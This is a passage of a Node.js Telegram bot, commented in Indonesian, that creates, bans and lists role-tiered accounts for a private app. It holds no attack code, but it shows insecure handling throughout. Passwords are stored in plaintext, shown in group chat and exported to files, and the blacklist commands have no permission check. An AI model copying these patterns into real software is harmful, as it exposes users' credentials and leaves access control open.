        chatId: chatId

    };

});
function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ========== COMMAND TELEGRAM (SISTEM DARI TELEGRAM SERVICE) ==========

// COMMAND UPDATE SHA & VERSION
bot.onText(/^\/updateSHA\s+([A-Fa-f0-9:]+)\s+(.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  // Cuma God & Developer yang bisa update
  if (role !== "god" ) {
    return bot.sendMessage(chatId, "❌ Hanya God/Developer yang bisa update SHA & Versi APK.");
  }

  const newSha = match[1].toUpperCase();
  const newVersion = match[2].trim();

  saveAppSecurity({ appVersion: newVersion, appCertificate: newSha });
  
  bot.sendMessage(chatId, `✅ Security APK berhasil diupdate!\n\nVersi: ${newVersion}\nSHA-256: ${newSha}\n\nSekarang user wajib pakai APK dengan versi & SHA ini.`);
});

// COMMAND MAINTENANCE
bot.onText(/^\/maintenance (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  if (role !== "god") {
    return bot.sendMessage(chatId, "❌ Hanya God yang bisa menggunakan command ini.");
  }

  const reason = match[1];
  saveMaintenance({ active: true, reason: reason });
  
  // Kick semua user yang lagi login
  for (const k in activeKeys) {
    delete activeKeys[k];
  }
  
  bot.sendMessage(chatId, `✅ Mode maintenance diaktifkan.\nAlasan: ${reason}\n\nSemua user yang sedang online akan di-kick.`);
});

// COMMAND DONE MAINTENANCE
bot.onText(/^\/dmaintenance$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  if (role !== "god") {
    return bot.sendMessage(chatId, "❌ Hanya God yang bisa menggunakan command ini.");
  }

  saveMaintenance({ active: false, reason: "" });
  bot.sendMessage(chatId, "✅ Mode maintenance telah dinonaktifkan. Semua user bisa login kembali.");
});

// COMMAND BAN ACCOUNT
bot.onText(/^\/banacc (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  if (role !== "god") {
    return bot.sendMessage(chatId, "❌ Hanya God yang bisa ban akun.");
  }

  const targetUsername = match[1].trim();
  const db = loadDatabase();
  const user = db.find(u => u.username === targetUsername);

  if (!user) {
    return bot.sendMessage(chatId, `❌ User ${targetUsername} tidak ditemukan.`);
  }

  user.isBanned = true;
  saveDatabase(db);
  
  // Hapus sesi aktifnya biar langsung ke-kick dari app
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === targetUsername);
  if (userKey && activeKeys[userKey.sessionKey]) {
    delete activeKeys[userKey.sessionKey];
  }

  bot.sendMessage(chatId, `✅ Akun ${targetUsername} telah dibanned dan di-kick dari aplikasi.`);
});

// COMMAND UNBAN ACCOUNT
bot.onText(/^\/unbanacc (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  if (role !== "god") {
    return bot.sendMessage(chatId, "❌ Hanya God yang bisa unban akun.");
  }

  const targetUsername = match[1].trim();
  const db = loadDatabase();
  const user = db.find(u => u.username === targetUsername);

  if (!user) {
    return bot.sendMessage(chatId, `❌ User ${targetUsername} tidak ditemukan.`);
  }

  user.isBanned = false;
  saveDatabase(db);

  bot.sendMessage(chatId, `✅ Akun ${targetUsername} telah di-unban dan bisa login kembali.`);
});

// ═══════════════════════════════════════════════════════════════════
// [+] HELPER: CEK ROLE & LIMIT /CKEY
// ═══════════════════════════════════════════════════════════════════

// Cek apakah user sudah pernah membuat role tertentu
function hasCreatedRoleBefore(userId, targetRole) {
  const db = loadDatabase();
  return db.some(u => 
    String(u.createdBy) === String(userId) && 
    (u.role || "member").toLowerCase() === targetRole.toLowerCase()
  );
}

// Cek limit role khusus (yang hanya boleh 1x)
function checkRoleLimit(userId, targetRole, creatorRole) {
  // Role yang dibatasi 1x per pembuat
  const LIMITED_ROLES = ["reseller", "partner", "owner", "developer"];
  
  // God bypass semua limit
  if (creatorRole === "god") return { allowed: true };
  
  // Member hanya boleh buat 1 akun total (bukan per role)
  if (creatorRole === "member") {
    const totalCreated = loadDatabase().filter(u => 
      String(u.createdBy) === String(userId)
    ).length;
    if (totalCreated >= 1) {
      return { allowed: false, reason: "Role Member hanya boleh membuat 1 akun total." };
    }
    return { allowed: true };
  }
  
  // VIP boleh buat member & reseller unlimited? 
  // Sesuai permintaan: VIP bisa buat reseller dan member (tanpa limit khusus)
  if (creatorRole === "vip") {
    return { allowed: true };
  }
  
  // Role lain: cek limit role spesifik
  if (LIMITED_ROLES.includes(targetRole)) {
    // Hanya batasi kalau targetRole SAMA dengan creatorRole
    // (misal owner buat owner = 1x, owner buat partner = bebas)
    if (targetRole === creatorRole && hasCreatedRoleBefore(userId, targetRole)) {
      return { 
        allowed: false, 
        reason: `Kamu sudah pernah membuat akun ${targetRole.toUpperCase()}. Maksimal 1x.` 
      };
    }
  }
  
  return { allowed: true };
}

// Mapping role yang boleh dibuat per role pembuat
function getAllowedRolesForCkey(creatorRole) {
  const map = {
    member:    ["member"],
    vip:       ["member", "reseller"],
    reseller:  ["member", "reseller"],
    partner:   ["member", "vip", "reseller", "partner"],
    owner:     ["member", "vip", "reseller", "partner", "owner"],
    developer: ["member", "vip", "reseller", "partner", "owner", "developer"],
    god:       ["member", "vip", "reseller", "partner", "owner", "developer"]
  };
  return map[creatorRole] || [];
}

// ══════════════════════════════════════════════════════════════
// [ /ckey ] — Create Account with Role Selection
// ══════════════════════════════════════════════════════════════
bot.onText(/^\/ckey (.+)$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const telegramRole = getTelegramRole(userId);
  const bl = getBlacklist();

  // ─── GUARD: Blacklist ─────────────────────────────────
  if (bl.includes(String(userId))) {
    return bot.sendMessage(chatId,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

  // ─── GUARD: Grup ──────────────────────────────────────
  if (chatId !== ID_GROUP) {
    return bot.sendMessage(chatId, "❌ Command ini hanya dapat digunakan di grup yang ditentukan.");
  }

  // ─── GUARD: Role harus punya akses ckey ───────────────
  const ALLOWED_CREATE = ["god", "developer", "owner", "partner", "reseller", "vip", "member"];
  if (!ALLOWED_CREATE.includes(telegramRole)) {
    return bot.sendMessage(chatId,
      `❌ ${msg.from.first_name}, kamu tidak memiliki akses.\nSilakan Chat @xyzyanzzi buat upgrade role.`
    );
  }

  // ─── PARSE INPUT ──────────────────────────────────────
  const parts = match[1].split(",");
  let username, password, duration, customRole;

  // Password otomatis 12 digit
  password = Array.from({ length: 12 }, () => Math.floor(Math.random() * 10)).join("");

  // Role user di grup
  const { role } = await getUserRoleFromGroup(userId);
  const isUnlimitedRole = UNLIMITED_ROLES.includes(role);

  if (isUnlimitedRole) {
    // Format: /ckey username,durasi[,role]
    if (parts.length < 2) {
      const allowedRoles = getAllowedRolesForCkey(telegramRole);
      return sendRich(chatId,
        `*Karena role kamu:* \`${telegramRole.toUpperCase()}\`\n\n` +
        `*Format 1:* \`/ckey username,durasi\`\n` +
        `*Format 2:* \`/ckey username,durasi,role\`\n\n` +
        `*Contoh:*\n` +
        `• \`/ckey user123,30\`\n` +
        `• \`/ckey user123,30,vip\`\n\n` +
        `🎭 *Role yang bisa kamu buat:* ${allowedRoles.join(", ")}`,
        { title: '❌ FORMAT SALAH', subtitle: 'Password otomatis 12 digit' }
      );
    }

    username = parts[0].trim();
    duration = parseInt(parts[1].trim());
    customRole = parts.length >= 3 ? parts[2].trim().toLowerCase() : "member";

    const allowedRoles = getAllowedRolesForCkey(telegramRole);
    if (!allowedRoles.includes(customRole)) {
      return bot.sendMessage(chatId,
        `❌ Role tidak valid!\n\n` +
        `Role yang bisa kamu buat: ${allowedRoles.join(", ")}`
      );
    }
  } else {
    // Format: /ckey username,durasi
    if (parts.length !== 2) {
      return bot.sendMessage(chatId,
        "❌ Format Salah!\n\n" +
        "Gunakan format:\n" +
        "/ckey username,durasi\n\n" +
        "Contoh:\n" +
        "/ckey user123,30"
      );
    }

    username = parts[0].trim();
    duration = parseInt(parts[1].trim());
    customRole = "member";
  }

  // ─── VALIDASI INPUT ───────────────────────────────────
  if (isNaN(duration) || duration <= 0) {
    return bot.sendMessage(chatId, "❌ Durasi hari harus berupa angka positif!");
  }

  if (!username || username.length < 3) {
    return bot.sendMessage(chatId, "❌ Username minimal 3 karakter!");
  }

  // ─── CEK USERNAME DUPLIKAT ────────────────────────────
  const db = loadDatabase();
  if (db.find(u => u.username === username)) {
    return sendRich(chatId,
      `Username \`${username}\` sudah digunakan, coba yang lain.`,
      { title: '❌ USERNAME SUDAH ADA', subtitle: 'Silakan gunakan username lain' }
    );
  }

  // ─── BUILD BUTTONS ────────────────────────────────────
  const buttons = [];

  const roleButtons = {
    member:     { label: "👤 Member",    role: "member" },
    vip:        { label: "⭐ VIP",        role: "vip" },
    reseller:   { label: "💼 Reseller",  role: "reseller" },
    partner:    { label: "🤝 Partner",   role: "partner" },
    owner:      { label: "👑 Owner",     role: "owner" },
    developer:  { label: "🥷 Developer", role: "developer" }
  };

  const allowedRoles = getAllowedRolesForCkey(telegramRole);
  const availableButtons = allowedRoles
    .map(r => roleButtons[r])
    .filter(Boolean);

  // Group 2 tombol per baris
  for (let i = 0; i < availableButtons.length; i += 2) {
    const row = [availableButtons[i]];
    if (availableButtons[i + 1]) row.push(availableButtons[i + 1]);
    buttons.push(row.map(b => ({
      text: b.label,
      callback_data: `ckeyrole:${b.role}:${username}:${password}:${duration}`,
      style: "success"
    })));
  }

  // Tombol batal
  buttons.push([{
    text: "❌ Batal",
    callback_data: "ckey_cancel",
    style: "danger"
  }]);

  // ─── KIRIM PESAN PILIHAN ROLE ─────────────────────────
  const sent = await bot.sendMessage(
    chatId,
    "🎭 Pilih role akun yang ingin dibuat.",
    { reply_markup: { inline_keyboard: buttons } }
  );

  // ─── SIMPAN SESSION ───────────────────────────────────
  pendingCkey[userId] = {
    owner: userId,
    messageId: sent.message_id,
    chatId,
    username,
    password,
    duration
  };
});

bot.onText(/^\/bl(?: (.+))?$/, (msg, match) => {
  let id;

  if (msg.reply_to_message) {
    id = msg.reply_to_message.from.id;
  } else if (match[1]) {
    id = match[1];
  } else {
    return bot.sendMessage(msg.chat.id, "Reply pesan atau /bl <id>");
  }

  const bl = getBlacklist();

  if (bl.includes(String(id)))
    return bot.sendMessage(msg.chat.id, "User sudah di-blacklist.");

  bl.push(String(id));
  saveBlacklist(bl);

  bot.sendMessage(msg.chat.id, `✅ ${id} berhasil di-blacklist.`);
});

bot.onText(/^\/debl(?: (.+))?$/, (msg, match) => {
  let id;

  if (msg.reply_to_message) {
    id = msg.reply_to_message.from.id;
  } else if (match[1]) {
    id = match[1];
  } else {
    return bot.sendMessage(msg.chat.id, "Reply pesan atau /debl <id>");
  }

  let bl = getBlacklist();

  if (!bl.includes(String(id)))
    return bot.sendMessage(msg.chat.id, "User tidak ada di blacklist.");

  bl = bl.filter(x => x !== String(id));
  saveBlacklist(bl);

  bot.sendMessage(msg.chat.id, `✅ ${id} berhasil dihapus dari blacklist.`);
});

bot.onText(/^\/listbl$/, async (msg) => {
  const bl = getBlacklist();

  if (!bl.length) {
    return bot.sendMessage(msg.chat.id, "Blacklist kosong.");
  }

  await sendRich(msg.chat.id,
    bl.map((x, i) => `${i + 1}. \`${x}\``).join('\n'),
    {
      title: `📋 BLACKLIST (${bl.length})`,
      footer: '/debl <id> untuk hapus'
    }
  );
});
// COMMAND /start atau /menu
bot.onText(/^\/?(start|menu)$/, async (msg) => {

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
    const bl = getBlacklist();

    if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }
    if (chatId !== ID_GROUP) {
        return bot.sendMessage(
            chatId,
            "❌ Command ini hanya dapat digunakan di grup utama."
        );
    }

    try {
  const richCaption = buildRichCaption(
    `AUTHOR : @xyzyanzzi\n` +
    `BOT NAME : X-FORCE Project APSS\n` +
    `VERSION : 1.0.0 New\n` +
    `STATUS : PRIVATE\n\n` +
    `〔 Informasi Bot 〕\n` +
    `NAME : ${username}\n` +
    `ID : ${userId}`,
    {
      title: 'ᴛᴡᴏʙʟᴜᴇ ᴘʀᴏᴊᴇᴄᴛ 𝙰𝙿𝙿𝚂 𝙱𝙾𝚃',
      subtitle: 'ᴛᴡᴏʙʟᴜᴇ 𝙰𝙿𝙿𝚂 𝙱𝙾𝚃 ʜᴀs ᴀʀʀɪᴠᴇᴅ',
      footer: '© X-FORCE Project | @xyzyanzzi',
      parseMode: 'HTML'
    }
  );

  await bot.sendPhoto(
    chatId,
    "https://files.catbox.moe/jlz2cr.jpg",
    {
      caption: richCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔑 CREATE KEY", callback_data: "menu_createkey" },
            { text: "⚙️ OTHER MENU", callback_data: "menu_admin" }
          ],
          [
            { text: "📢 CHANNEL", url: "https://t.me/xforceinformation" }
          ]
        ]
      }
    }
  );
} catch (err) {
  logError("❌ Gagal mengirim menu!");
  logError("Message :", err.message);
  logError("Code    :", err.code);
  logError("Response:", err.response?.body || err.response);
  logError(err);
}

});
// COMMAND /myakun
bot.onText(/^\/myakun$/, async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const bl = getBlacklist();

  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

  if (chatId !== ID_GROUP) {
    return bot.sendMessage(
      chatId,
      "❌ Command ini hanya dapat digunakan di grup yang ditentukan."
    );
  }

  const { isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }

  const db = loadDatabase();
  const myAccounts = db.filter(acc => acc.createdBy === userId);

  if (myAccounts.length === 0) {
    return bot.sendMessage(chatId, "📭 Anda belum memiliki akun yang dibuat.");
  }

  await sendRich(chatId,
    myAccounts.map((acc, idx) =>
      `${idx + 1}. 👤 *${acc.username}* | 🎭 ${acc.role} | ⏳ ${acc.expiredDate}`
    ).join('\n'),
    {
      title: `AKUN YANG ANDA BUAT (${myAccounts.length})`,
      footer: '💡 Gunakan /cekkadaluarsa untuk cek masa aktif'
    }
  );
});

// COMMAND /cekkadaluarsa
bot.onText(/^\/cekkadaluarsa$/, async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const bl = getBlacklist();

  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

  if (chatId !== ID_GROUP) {
    return bot.sendMessage(
      chatId,
      "❌ Command ini hanya dapat digunakan di grup yang ditentukan."
    );
  }

  const { isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }

  const db = loadDatabase();
  const myAccounts = db.filter(acc => acc.createdBy === userId);

  if (myAccounts.length === 0) {
    return bot.sendMessage(chatId, "📭 Anda belum memiliki akun.");
  }

  const today = new Date();
  let lines = '';
  myAccounts.forEach((acc, idx) => {
    const expiredDate = new Date(acc.expiredDate);
    const daysLeft = Math.ceil((expiredDate - today) / (1000 * 60 * 60 * 24));
    const status = daysLeft < 0 ? '❌ EXPIRED' : `✅ ${daysLeft} hari lagi`;
    lines += `${idx + 1}. *${acc.username}* (${acc.role}) → ${status}\n`;
  });

  await sendRich(chatId, lines, {
    title: '⏳ STATUS EXPIRED AKUN',
    footer: `Total: ${myAccounts.length} akun`
  });
});

// COMMAND /statakun
bot.onText(/^\/statakun$/, async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const bl = getBlacklist();

  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

  if (chatId !== ID_GROUP) {
    return bot.sendMessage(
      chatId,
      "❌ Command ini hanya dapat digunakan di grup yang ditentukan."
    );
  }

  const { role, isMember } = await getUserRoleFromGroup(userId);

  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }

  if (!UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(chatId, "❌ Fitur khusus untuk reseller/owner/partner/moderator/founder!");
  }

  const db = loadDatabase();
  if (db.length === 0) {
    return bot.sendMessage(chatId, "📭 Belum ada akun yang dibuat.");
  }

  const roleStats = {};
  const creatorStats = {};

  db.forEach(acc => {
    roleStats[acc.role] = (roleStats[acc.role] || 0) + 1;
    const creator = acc.creatorName || 'Unknown';
    creatorStats[creator] = (creatorStats[creator] || 0) + 1;
  });

  let lines = `📌 *Total Akun:* ${db.length}\n\n`;
  lines += `*🎭 Berdasarkan Role:*\n`;
  for (const [roleName, count] of Object.entries(roleStats)) {
    lines += `├ ${roleName.toUpperCase()}: ${count} (${((count / db.length) * 100).toFixed(1)}%)\n`;
  }
  lines += `\n*👑 Top Creator:*\n`;
  const sortedCreators = Object.entries(creatorStats).sort((a, b) => b[1] - a[1]);
  for (const [creator, count] of sortedCreators.slice(0, 10)) {
    lines += `├ ${creator}: ${count} akun\n`;
  }

  await sendRich(chatId, lines, {
    title: '📊 STATISTIK SEMUA AKUN',
    footer: '📌 Gunakan /semuaakun untuk detail lengkap'
  });
});

// COMMAND /semuaakun
bot.onText(/^\/semuaakun(?:\s+(\d+))?$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const page = match[1] ? parseInt(match[1]) : 1;
  const ITEMS_PER_PAGE = 15;
  const bl = getBlacklist();
  
  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }
  
  if (chatId !== ID_GROUP) {
  return bot.sendMessage(
    chatId,
    "❌ Command ini hanya dapat digunakan di grup yang ditentukan."
  );
}

  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  if (!UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(chatId, "❌ Fitur khusus untuk reseller/owner/partner/moderator/founder!");
  }
  
  const db = loadDatabase();
  if (db.length === 0) {
    return bot.sendMessage(chatId, "📭 Belum ada akun yang dibuat.");
  }
  
  if (db.length <= ITEMS_PER_PAGE) {
    let allList = `📊 SEMUA AKUN (${db.length} akun):\n\n`;
    db.forEach((acc, idx) => {
      allList += `${idx + 1}. 👤 ${acc.username} | 🎭 ${acc.role} | ⏳ ${acc.expiredDate} | 👑 ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`;
    });
    
    if (allList.length > 4000) {
      const fileName = `semua_akun_${Date.now()}.txt`;
      const fileContent = `LAPORAN SEMUA AKUN\nTanggal: ${new Date().toLocaleString('id-ID')}\nTotal Akun: ${db.length}\n\n${allList}`;
      fs.writeFileSync(fileName, fileContent, 'utf8');
      await bot.sendDocument(chatId, fileName, {
        caption: `📊 SEMUA AKUN\nTotal: ${db.length} akun\n📅 ${new Date().toLocaleString('id-ID')}`
      });
      fs.unlinkSync(fileName);
    } else {
      await bot.sendMessage(chatId, allList);
    }
    return;
  }
  
  const totalPages = Math.ceil(db.length / ITEMS_PER_PAGE);
  
  if (page < 1 || page > totalPages) {
    return bot.sendMessage(chatId, `❌ Halaman tidak valid! Total halaman: ${totalPages}\nGunakan /semuaakun 1 untuk halaman pertama`);
  }
  
  const startIdx = (page - 1) * ITEMS_PER_PAGE;
  const endIdx = Math.min(startIdx + ITEMS_PER_PAGE, db.length);
  const pageAccounts = db.slice(startIdx, endIdx);
  
  let allList = `📊 SEMUA AKUN (${db.length} total)\n`;
  allList += `📄 Halaman ${page} dari ${totalPages}\n`;
  allList += `📋 Menampilkan akun ${startIdx + 1}-${endIdx}\n\n`;
  
  pageAccounts.forEach((acc, idx) => {
    const globalIdx = startIdx + idx + 1;
    allList += `${globalIdx}. 👤 ${acc.username}\n`;
    allList += `   🎭 Role: ${acc.role.toUpperCase()}\n`;
    allList += `   ⏳ Expired: ${acc.expiredDate}\n`;
    allList += `   👑 Creator: ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`;
    allList += `   📅 Dibuat: ${acc.createdAt ? acc.createdAt.split('T')[0] : '-'}\n`;
    allList += `   🔐 Pass: ${acc.password}\n`;
    allList += `   ━━━━━━━━━━━━━━━━━━━━\n`;
  });
  
  allList += `\n📌 Navigasi:\n`;
  if (page > 1) allList += `◀️ /semuaakun ${page - 1} - Halaman sebelumnya\n`;
  if (page < totalPages) allList += `▶️ /semuaakun ${page + 1} - Halaman selanjutnya\n`;
  allList += `📊 /statakun - Lihat statistik\n`;
  allList += `💾 Ketik export untuk download semua data sebagai file`;
  
  await bot.sendMessage(chatId, allList);
});

// COMMAND /hapusakun
bot.onText(/^\/hapusakun (.+)$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const bl = getBlacklist();
  
  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }
  
  if (chatId !== ID_GROUP) {
  return bot.sendMessage(
    chatId,
    "❌ Command ini hanya dapat digunakan di grup yang ditentukan."
  );
}
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  }
  
  if (!UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(chatId, "❌ Fitur khusus untuk reseller/owner/partner/moderator/founder!");
  }
  
  const username = match[1].trim();
  const db = loadDatabase();
  const index = db.findIndex(u => u.username === username);
  
  if (index === -1) {
    return bot.sendMessage(chatId, "❌ Username tidak ditemukan.");
  }
  
  const deleted = db.splice(index, 1)[0];
  saveDatabase(db);
  
  bot.sendMessage(chatId, 
    "🗑️ AKUN BERHASIL DIHAPUS!\n\n" +
    "Username: " + deleted.username + "\n" +
    "Role: " + deleted.role + "\n" +
    "Dibuat oleh: " + (deleted.creatorRole || 'unknown') + " (" + (deleted.creatorName || '-') + ")"
  );
});

// Handle export
bot.onText(/^export$/, async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const bl = getBlacklist();
  
  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }
  
  if (chatId !== ID_GROUP) {
  return bot.sendMessage(
    chatId,
    "❌ Command ini hanya dapat digunakan di grup yang ditentukan."
  );
}
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember || !UNLIMITED_ROLES.includes(role)) {
    return bot.sendMessage(userId, "❌ Anda tidak memiliki akses ke fitur ini!");
  }
  
  const db = loadDatabase();
  if (db.length === 0) {
    return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  }
  
  const fileName = `export_akun_${Date.now()}.txt`;
  let fileContent = `LAPORAN LENGKAP SEMUA AKUN\n`;
  fileContent += `Tanggal Export: ${new Date().toLocaleString('id-ID')}\n`;
  fileContent += `Total Akun: ${db.length}\n`;
  fileContent += `${'='.repeat(60)}\n\n`;
  
  db.forEach((acc, idx) => {
    fileContent += `${idx + 1}. USERNAME: ${acc.username}\n`;
    fileContent += `   PASSWORD: ${acc.password}\n`;
    fileContent += `   ROLE: ${acc.role.toUpperCase()}\n`;
    fileContent += `   EXPIRED: ${acc.expiredDate}\n`;
    fileContent += `   CREATOR: ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`;
    fileContent += `   CREATOR ID: ${acc.createdBy || '-'}\n`;
    fileContent += `   DIBUAT: ${acc.createdAt ? acc.createdAt.split('T')[0] : '-'}\n`;
    fileContent += `${'-'.repeat(60)}\n`;
  });
  
  fs.writeFileSync(fileName, fileContent, 'utf8');
  
  await bot.sendDocument(userId, fileName, {
    caption: `📊 EXPORT DATA LENGKAP\nTotal: ${db.length} akun\n📅 ${new Date().toLocaleString('id-ID')}`
  });
  
  fs.unlinkSync(fileName);
});

// Callback untuk tombol "Cek Lagi"
bot.on("callback_query", async (query)=>{
try {

const userId = query.from.id;
const chatId = query.message.chat.id;
const username = query.from.username
    ? `@${query.from.username}`
    : "Tidak ada username";
const data = query.data;

if (data === "menu_createkey") {

    await bot.answerCallbackQuery(query.id);

    return bot.editMessageCaption(
`<blockquote>〔 𝙲𝚁𝙴𝙰𝚃𝙴 𝙺𝙴𝚈 𝚃𝚄𝚃𝙾𝚁 〕

<b>Format Custom Role</b>
(Hanya role tertentu)
<code>/ckey username,durasi,role</code>
Contoh:
<code>/ckey john,30,vip</code>
━━━━━━━━━━━━━━━━━━
<b>Role yang tersedia</b>
🎭 ${ALLOWED_CUSTOM_ROLES.join(", ")}
━━━━━━━━━━━━━━━━━━
Contoh lain:
<code>/ckey X-FORCE,123456,7</code>
<code>/ckey X-FORCE,123456,30,premium</code>
━━━━━━━━━━━━━━━━━━

Pastikan:
• Username belum digunakan.
• Password minimal 3 karakter.
• Durasi berupa angka (hari).
• Pisahkan dengan koma (,).</blockquote>`,
{
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [
            [
                {
                    text: "⬅️ BACK",
                    callback_data: "menu_home",
                    style : "danger"
                }
            ]
        ]
    }
});

}

if (data === "menu_admin") {

    await bot.answerCallbackQuery(query.id);

    return bot.editMessageCaption(
`<blockquote>〔 𝙰𝙳𝙼𝙸𝙽 𝙼𝙴𝙽𝚄 〕
━━━━━━━━━━━━━━━━━━
<b>👤 Account</b>
<code>/myakun</code>
Melihat akun yang kamu buat.

<code>/cekkadaluarsa</code>
Melihat masa aktif akun.
━━━━━━━━━━━━━━━━━━
<b>🔑 Create Key</b>
<code>/ckey username,durasi</code>
<code>/ckey username,durasi,role</code>
━━━━━━━━━━━━━━━━━━
<b>📊 Management</b>

<code>/semuaakun</code>
Melihat seluruh akun.

<code>/statakun</code>
Statistik akun.

<code>/hapusakun username</code>
Menghapus akun.
━━━━━━━━━━━━━━━━━━
<b>👥 Telegram Role</b>

<code>/addrole</code>
Reply pesan user.

<code>/addrole 123456789</code>

<code>/info</code>
Melihat informasi user.
━━━━━━━━━━━━━━━━━━
<b>⚙️ Server</b>
<code>/clear</code>
Membersihkan session kosong.

<code>/restart</code>
Restart bot.
━━━━━━━━━━━━━━━━━━</blockquote>`,
{
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [
            [
                {
                    text: "⬅️ BACK",
                    callback_data: "menu_home",
                    style : "danger"
                }
            ]
        ]
    }
});

}

// ================= HOME =================
if (data === "menu_home") {

    await bot.answerCallbackQuery(query.id);

    return bot.editMessageCaption(
`<blockquote>〔 ᴛᴡᴏʙʟᴜᴇ ᴘʀᴏᴊᴇᴄᴛ 𝙰𝙿𝙿𝚂 𝙱𝙾𝚃 〕
ᴛᴡᴏʙʟᴜᴇ 𝙰𝙿𝙿𝚂 𝙱𝙾𝚃 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.

┏━━━━━━━━━━
┃ AUTHOR : @xyzyanzzi
┃ BOT NAME : X-FORCE Apps
┃ VERSION : 1.0.0
┃ STATUS : PRIVATE
┗━━━━━━━━━━
〔 Informasi Bot 〕
┏━━━━━━━━━━━━━━
┃ NAME : ${query.from.username ? '@' + query.from.username : 'Tidak ada username'}
┃ ID : <code>${query.from.id}</code>
┗━━━━━━━━━━━━━━⪼</blockquote>`,
        {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "🔑 CREATE KEY",
                            callback_data: "menu_createkey",
                            style : "danger"
                        },
                        {
                            text: "⚙️ OTHER MENU",
                            callback_data: "menu_admin",
                            style : "primary"
                        }
                    ],
                    [
                        {
                            text: "📢 CHANNEL",
                            url: "https://t.me/xforceinformation",
                            style : "success"
                        }
                    ]
                ]
            }
        }
    );
}

if (data.startsWith("ckeyrole:") || data === "ckey_cancel") {

    const session = pendingCkey[query.from.id];

    if (!session) {
        return bot.answerCallbackQuery(query.id, {
